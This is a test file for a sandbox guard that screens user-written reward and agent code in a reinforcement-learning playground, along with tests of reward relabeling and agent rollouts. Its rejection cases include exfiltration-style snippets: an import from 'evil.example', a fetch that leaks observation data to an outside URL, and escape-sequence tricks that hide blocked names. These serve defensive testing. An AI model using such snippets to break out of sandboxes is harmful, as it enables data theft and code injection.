import { test, expect, describe } from "bun:test";
import { checkUserCode, locateSyntaxError, MAX_CODE_BYTES, BLOCKED_TOKENS } from "../../src/lib/sandbox/guard";
import { neuterGlobals, NEUTERED_GLOBALS } from "../../src/lib/sandbox/harden";
import { UserCodeFailure } from "../../src/lib/sandbox/protocol";
import {
  REWARD_PRESETS,
  buildRewardJob,
  originalDataset,
  relabelDataset,
  relabelRows,
  rewardHeatmap,
  rewardSummary,
  type RewardFn,
} from "../../src/lib/sandbox/reward";
import {
  AGENT_TEMPLATES,
  GRID_HORIZON,
  gridOptimalEpisodes,
  gridRandomEpisodes,
  playgroundGridEnv,
  replayGridActions,
  replayThrusterCommands,
  runUserGridAgent,
  runUserThrusterAgent,
  summarizeGrid,
  summarizeThruster,
  thrusterBehaviorEpisodes,
  thrusterCoastEpisodes,
  type GridActFn,
  type ThrusterActFn,
} from "../../src/lib/sandbox/agent";
import { generateDataset, qStar } from "../../src/lib/rl";
import { benchmarkThruster, generateThrusterDataset, HORIZON, KNEE } from "../../src/lib/thrusterchain";

/** Test-only stand-in for the worker's compile step (presets/templates are trusted here). */
function compile<T>(code: string, name: string): T {
  return new Function(`"use strict";\n${code}\n;return ${name};`)() as T;
}

const actCode = (snippet: string) => `function act(obs, ctx) {\n  const a = 1;\n  ${snippet}\n  return 0;\n}`;

describe("static guard", () => {
  test("accepts every reward preset and agent template", () => {
    for (const p of REWARD_PRESETS) expect(checkUserCode(p.code, { requireFunction: "reward" })).toEqual({ ok: true });
    for (const list of Object.values(AGENT_TEMPLATES)) for (const t of list) expect(checkUserCode(t.code, { requireFunction: "act" })).toEqual({ ok: true });
  });

  const dangerous: [string, string][] = [
    ['import("https://evil.example/x.js")', "import"],
    ['const fs = require("fs")', "require"],
    ['eval("1 + 1")', "eval"],
    ['const f = new Function("return 1")', "Function"],
    ["const F = ctx.x.constructor", "constructor"],
    ['const C = obs["constructor"]', "constructor"],
    ["const p = obs.__proto__", "__proto__"],
    ["Array.prototype.push = null", "prototype"],
    ["globalThis.x = 1", "globalThis"],
    ["self.x = 1", "self"],
    ["postMessage({ leak: obs })", "postMessage"],
    ['fetch("https://example.com/?q=" + obs.s)', "fetch"],
    ["const x = new XMLHttpRequest()", "XMLHttpRequest"],
    ['const w = new WebSocket("wss://example.com")', "WebSocket"],
    ['const es = new EventSource("/stream")', "EventSource"],
    ['importScripts("https://example.com/x.js")', "importScripts"],
    ['indexedDB.open("db")', "indexedDB"],
    ['caches.open("c")', "caches"],
    ['const bc = new BroadcastChannel("c")', "BroadcastChannel"],
    ['const w = new Worker("w.js")', "Worker"],
    ['const w = new SharedWorker("w.js")', "SharedWorker"],
    ['navigator.sendBeacon("/b", "x")', "navigator"],
    ['const b = obs.sendBeacon', "sendBeacon"],
    ['localStorage.setItem("k", "v")', "localStorage"],
    ['setTimeout("while(1){}", 0)', "setTimeout"],
  ];
  for (const [snippet, token] of dangerous) {
    test(`rejects \`${token}\` on the right line`, () => {
      const r = checkUserCode(actCode(snippet), { requireFunction: "act" });
      expect(r.ok).toBe(false);
      if (r.ok) return;
      expect(r.line).toBe(3);
      expect(r.token).toBe(token);
      expect(r.message).toStartWith("Line 3:");
    });
  }

  test("every blocked token has a test or is a near-duplicate", () => {
    const covered = new Set(dangerous.map(([, t]) => t));
    const extra = BLOCKED_TOKENS.filter((t) => !covered.has(t));
    // remaining names share a rule with a tested one
    expect(extra.every((t) => ["onmessage", "WebTransport", "sessionStorage", "setInterval", "WebAssembly"].includes(t))).toBe(true);
  });

  test("reports the first offence and its line, not later ones", () => {
    const code = "function reward(s, a, s2, ctx) {\n  const ok = 1;\n\n  const x = eval('1');\n  fetch('/');\n  return 0;\n}";
    const r = checkUserCode(code, { requireFunction: "reward" });
    expect(r.ok).toBe(false);
    if (!r.ok) {
      expect(r.line).toBe(4);
      expect(r.token).toBe("eval");
    }
  });

  test("comments may mention blocked names; strings may not", () => {
    expect(checkUserCode("// fetch, eval, self-loops and the constructor are fine here\n/* globalThis */\nfunction act(obs, ctx) { return 0; }", { requireFunction: "act" }).ok).toBe(true);
    const r = checkUserCode('function act(obs, ctx) {\n  const k = "fetch";\n  return 0;\n}', { requireFunction: "act" });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.line).toBe(2);
  });

  test("lexer tricks do not hide code from the scan", () => {
    const tricks = [
      'const u = "//";\n  fetch("/")',
      'const t = `a ${ fetch("/") } b`',
      'const re = /[//]/; fetch("/")',
      'if (a) /[//]/.test("x"); fetch("/")',
      "const s = '/*';\n  fetch('/')",
    ];
    for (const t of tricks) {
      const r = checkUserCode(actCode(t), { requireFunction: "act" });
      expect(r.ok).toBe(false);
      if (!r.ok) expect(r.token).toBe("fetch");
    }
  });

  test("escape sequences that could spell blocked names are rejected", () => {
    for (const snippet of ['const k = obs["\\u0063onstructor"]', 'const k = obs["\\x63onstructor"]', 'const k = obs["con\\structor"]', "f\\u0065tch('/')", 'const k = "con\\\nstructor"']) {
      const r = checkUserCode(actCode(snippet), { requireFunction: "act" });
      expect(r.ok).toBe(false);
      if (!r.ok) expect(r.line).toBe(3);
    }
    expect(checkUserCode(actCode('const k = "tab\\tnew\\nquote\\" ok"'), { requireFunction: "act" }).ok).toBe(true);
  });

  test("whole-word matching avoids false positives", () => {
    const code = "function act(obs, ctx) {\n  const myfetch = 1, selfish = 2, evaluate = 3, Functional = 4, importance = 5, workers = 6;\n  return 0;\n}";
    expect(checkUserCode(code, { requireFunction: "act" }).ok).toBe(true);
  });

  test("size limit, empty code and missing function", () => {
    const big = `function act(obs, ctx) { return 0; }\n${"// padding padding padding padding\n".repeat(Math.ceil(MAX_CODE_BYTES / 30))}`;
    const r = checkUserCode(big, { requireFunction: "act" });
    expect(r.ok).toBe(false);
    if (!r.ok) {
      expect(r.message).toContain("limit is 20 KB");
      expect(r.line).toBeGreaterThan(1);
    }
    expect(checkUserCode("   \n ", { requireFunction: "act" }).ok).toBe(false);
    const missing = checkUserCode("function reward(s) { return 0; }", { requireFunction: "act" });
    expect(missing.ok).toBe(false);
    expect(checkUserCode("const act = (obs) => 0;", { requireFunction: "act" }).ok).toBe(true);
  });

  test("syntax-error hints point at the unbalanced bracket", () => {
    expect(locateSyntaxError("function act(obs) {\n  if (obs.s > 1 {\n    return 1;\n  }\n}")?.line).toBe(2);
    expect(locateSyntaxError('function act(obs) {\n  return "oops;\n}')?.line).toBe(2);
    expect(locateSyntaxError("function act(obs) { return 0; }")).toBeNull();
  });
});

describe("runtime hardening", () => {
  test("neuterGlobals removes network/storage names from a global-like object", () => {
    class FakeScope {
      get indexedDB() {
        return {};
      }
    }
    const g = new FakeScope() as unknown as Record<string, unknown>;
    Object.assign(g, {
      fetch: () => 1,
      XMLHttpRequest: class {},
      WebSocket: class {},
      caches: {},
      importScripts: () => 1,
      postMessage: () => 1,
      navigator: { sendBeacon: () => true },
      Math,
    });
    const nav = g.navigator as Record<string, unknown>;
    const report = neuterGlobals(g);
    for (const name of NEUTERED_GLOBALS) expect(g[name]).toBeUndefined();
    expect(nav.sendBeacon).toBeUndefined();
    expect(g.Math).toBe(Math);
    expect(report.failed).toEqual([]);
    expect(report.removed).toContain("fetch");
    expect(report.removed).toContain("indexedDB");
    expect(() => {
      g.fetch = () => 2;
    }).toThrow();
  });
});

describe("reward relabeling", () => {
  const grid = generateDataset("gridworld-random", 7);

  const relabelWith = (base: typeof grid, code: string) => {
    const job = buildRewardJob(base);
    const rewards = relabelRows(job.rows, job.original, job.info, compile<RewardFn>(code, "reward"));
    return { job, rewards, ds: relabelDataset(base, rewards, "test") };
  };

  test("original preset is an exact no-op", () => {
    const { rewards, ds } = relabelWith(grid, REWARD_PRESETS[0].code);
    grid.transitions.forEach((t, i) => expect(rewards[i]).toBe(t.r));
    expect(Array.from(ds.rewardMean)).toEqual(Array.from(grid.rewardMean));
    for (let s = 0; s < 100; s++) for (let a = 0; a < 4; a++) expect(ds.env.step(s, a)).toEqual(grid.env.step(s, a));
    expect(originalDataset(ds)).toBe(grid);
    expect(originalDataset(grid)).toBe(grid);
  });

  test("sparse goal changes only r and keeps the env consistent", () => {
    const { ds } = relabelWith(grid, REWARD_PRESETS.find((p) => p.id === "sparse-goal")!.code);
    expect(ds.transitions.length).toBe(grid.transitions.length);
    ds.transitions.forEach((t, i) => {
      const o = grid.transitions[i];
      expect([t.s, t.a, t.s2, t.done]).toEqual([o.s, o.a, o.s2, o.done]);
      expect(t.r).toBe(grid.env.terminals.get(t.s2) === "goal" ? 1 : 0);
    });
    expect(ds.rewardMin).toBe(0);
    expect(ds.rewardMax).toBe(1);
    // ground truth uses the NEW reward: stepping into the goal (9,0) from (8,0) pays 1, other moves 0
    expect(ds.env.step(8, 1)).toEqual({ s2: 9, r: 1, done: true });
    expect(ds.env.step(90, 0).r).toBe(0);
    const Q = qStar(ds.env, 0.95);
    expect(Math.max(Q[8 * 4], Q[8 * 4 + 1], Q[8 * 4 + 2], Q[8 * 4 + 3])).toBe(1);
  });

  test("all presets produce finite rewards on every built-in dataset", () => {
    const cheetah = generateDataset("halfcheetah-medium", 11);
    const thruster = generateThrusterDataset(7);
    for (const base of [grid, cheetah, thruster]) {
      for (const p of REWARD_PRESETS) {
        const { rewards, ds } = relabelWith(base, p.code);
        expect(rewards.every(Number.isFinite)).toBe(true);
        expect(ds.transitions.length).toBe(base.transitions.length);
      }
    }
    // empirical env (ThrusterChain): step() follows the relabeled data's statistics
    const { ds } = relabelWith(thruster, REWARD_PRESETS.find((p) => p.id === "distance-shaping")!.code);
    const k = ds.counts.findIndex((c) => c > 0);
    expect(ds.env.step(Math.floor(k / 4), k % 4)).toEqual({ s2: ds.modeNext[k], r: ds.rewardMean[k], done: false });
  });

  test("invalid reward outputs are rejected with the transition", () => {
    const job = buildRewardJob(grid);
    for (const bad of ["return NaN;", 'return "1";', "return undefined;", "return Infinity;"]) {
      const fn = compile<RewardFn>(`function reward(s, a, s2, ctx) { ${bad} }`, "reward");
      try {
        relabelRows(job.rows, job.original, job.info, fn);
        throw new Error("expected a failure");
      } catch (e) {
        expect(e).toBeInstanceOf(UserCodeFailure);
        expect((e as UserCodeFailure).kind).toBe("output");
        expect((e as Error).message).toContain("transition #0");
      }
    }
    const throwing = compile<RewardFn>("function reward() { throw new Error('boom'); }", "reward");
    expect(() => relabelRows(job.rows, job.original, job.info, throwing)).toThrow(UserCodeFailure);
  });

  test("heatmap and summary", () => {
    const { rewards } = relabelWith(grid, REWARD_PRESETS.find((p) => p.id === "hazard-averse")!.code);
    const all = rewardHeatmap(grid, rewards, { action: "all", diff: false });
    const s0 = grid.transitions[0].s;
    const idx = grid.transitions.map((t, i) => [t, i] as const).filter(([t]) => t.s === s0);
    const mean = idx.reduce((acc, [, i]) => acc + rewards[i], 0) / idx.length;
    expect(all.values[s0]).toBeCloseTo(mean, 12);
    expect(all.counts[s0]).toBe(idx.length);
    expect(Number.isNaN(all.values[grid.env.terminals.keys().next().value as number])).toBe(true);
    const up = rewardHeatmap(grid, rewards, { action: 0, diff: true });
    expect(up.counts[s0]).toBe(idx.filter(([t]) => t.a === 0).length);
    const same = relabelWith(grid, REWARD_PRESETS[0].code).rewards;
    const diff0 = rewardHeatmap(grid, same, { action: "all", diff: true });
    expect(diff0.lo).toBe(0);
    expect(diff0.hi).toBe(0);
    const sum = rewardSummary(grid, rewards);
    expect(sum.n).toBe(grid.transitions.length);
    expect(sum.changed).toBeGreaterThan(0);
    expect(sum.min).toBe(-20);
  });
});

describe("agent rollouts", () => {
  const tpl = (env: keyof typeof AGENT_TEMPLATES, id: string) => AGENT_TEMPLATES[env].find((t) => t.id === id)!.code;

  test("BFS template reaches the goal with the optimal return", () => {
    const env = playgroundGridEnv("gridworld-random");
    const actions = runUserGridAgent("gridworld-random", compile<GridActFn>(tpl("gridworld-random", "bfs"), "act"), 5);
    const eps = replayGridActions(env, actions, 5);
    const opt = gridOptimalEpisodes(env, 5);
    eps.forEach((e, i) => {
      expect(e.goal).toBe(true);
      expect(e.hazards).toBe(0);
      expect(e.ret).toBeCloseTo(opt[i].ret, 9);
    });
    const s = summarizeGrid("you", "You", eps);
    expect(s.goalEpisodes).toBe(5);
    expect(s.meanSteps).toBe(opt[0].steps.length);
  });

  test("random template using ctx.random() reproduces the Random baseline", () => {
    const env = playgroundGridEnv("gridworld-random");
    const actions = runUserGridAgent("gridworld-random", compile<GridActFn>(tpl("gridworld-random", "random"), "act"), 8);
    const base = gridRandomEpisodes(env, 8);
    expect(actions).toEqual(base.map((e) => e.steps.map((st) => st.a)));
    expect(replayGridActions(env, actions, 8).map((e) => e.ret)).toEqual(base.map((e) => e.ret));
  });

  test("HalfCheetah level controller matches Q* and never flips", () => {
    const env = playgroundGridEnv("halfcheetah-medium");
    const eps = replayGridActions(env, runUserGridAgent("halfcheetah-medium", compile<GridActFn>(tpl("halfcheetah-medium", "level"), "act"), 3), 3);
    const opt = gridOptimalEpisodes(env, 3);
    expect(eps[0].hazards).toBe(0);
    expect(eps[0].steps.length).toBe(GRID_HORIZON);
    expect(eps[0].ret).toBeCloseTo(opt[0].ret, 6);
  });

  test("thruster baselines match benchmarkThruster's paired seeds", () => {
    const coast = summarizeThruster("coast", "Coast", thrusterCoastEpisodes(6));
    const bCoast = benchmarkThruster({ mode: "coast" }, 6);
    coast.returns.forEach((r, i) => expect(r).toBeCloseTo(bCoast.returns[i], 6));
    const beh = summarizeThruster("behavior", "Behavior", thrusterBehaviorEpisodes(6));
    const bBeh = benchmarkThruster({ mode: "behavior" }, 6);
    beh.returns.forEach((r, i) => expect(r).toBeCloseTo(bBeh.returns[i], 6));
  });

  test("thruster templates: coast template = coast baseline, damping beats it", () => {
    const n = 6;
    const coastCmds = runUserThrusterAgent(compile<ThrusterActFn>(tpl("thrusterchain-stall", "coast"), "act"), n);
    const coast = replayThrusterCommands(coastCmds, n);
    expect(coast.map((e) => e.ret)).toEqual(thrusterCoastEpisodes(n).map((e) => e.ret));
    const damp = summarizeThruster("you", "You", replayThrusterCommands(runUserThrusterAgent(compile<ThrusterActFn>(tpl("thrusterchain-stall", "damping"), "act"), n), n));
    expect(damp.meanReturn).toBeGreaterThan(summarizeThruster("c", "c", coast).meanReturn);
    expect(damp.stallRate).toBe(0);
  });

  test("out-of-range commands are clipped by executedCommand and count as stalls", () => {
    const fn = compile<ThrusterActFn>("function act() { return [5, -5, 0, 0.5]; }", "act");
    const eps = replayThrusterCommands(runUserThrusterAgent(fn, 1), 1);
    expect(eps[0].steps[0].cmd).toEqual([1, -1, 0, 0.5]);
    expect(eps[0].stallSteps).toBe(HORIZON);
    expect(KNEE).toBeLessThan(1);
  });

  test("invalid actions and commands are rejected", () => {
    const bad: [string, "grid" | "thruster"][] = [
      ["function act() { return 4; }", "grid"],
      ["function act() { return 1.5; }", "grid"],
      ['function act() { return "1"; }', "grid"],
      ["function act() { return [0, 0, 0]; }", "thruster"],
      ["function act() { return [0, NaN, 0, 0]; }", "thruster"],
      ["function act() { return 0; }", "thruster"],
    ];
    for (const [code, kind] of bad) {
      const fn = compile<GridActFn & ThrusterActFn>(code, "act");
      const run = () => (kind === "grid" ? runUserGridAgent("gridworld-random", fn, 1) : runUserThrusterAgent(fn, 1));
      expect(run).toThrow(UserCodeFailure);
    }
  });

  test("replay rejects malformed sandbox results", () => {
    const env = playgroundGridEnv("gridworld-random");
    expect(() => replayGridActions(env, [[7]], 1)).toThrow();
    expect(() => replayGridActions(env, [[0, 0]], 1)).toThrow(); // ends before termination and the horizon
    expect(() => replayGridActions(env, [], 1)).toThrow();
    expect(() => replayGridActions(env, "x", 1)).toThrow();
    const ok = runUserGridAgent("gridworld-random", compile<GridActFn>(tpl("gridworld-random", "bfs"), "act"), 1);
    expect(() => replayGridActions(env, [[...ok[0], 0]], 1)).toThrow(); // actions after termination
    expect(() => replayThrusterCommands([[0, 0, 0, 0]], 1)).toThrow();
    expect(() => replayThrusterCommands([new Array(4 * HORIZON).fill(Infinity)], 1)).toThrow();
  });
});
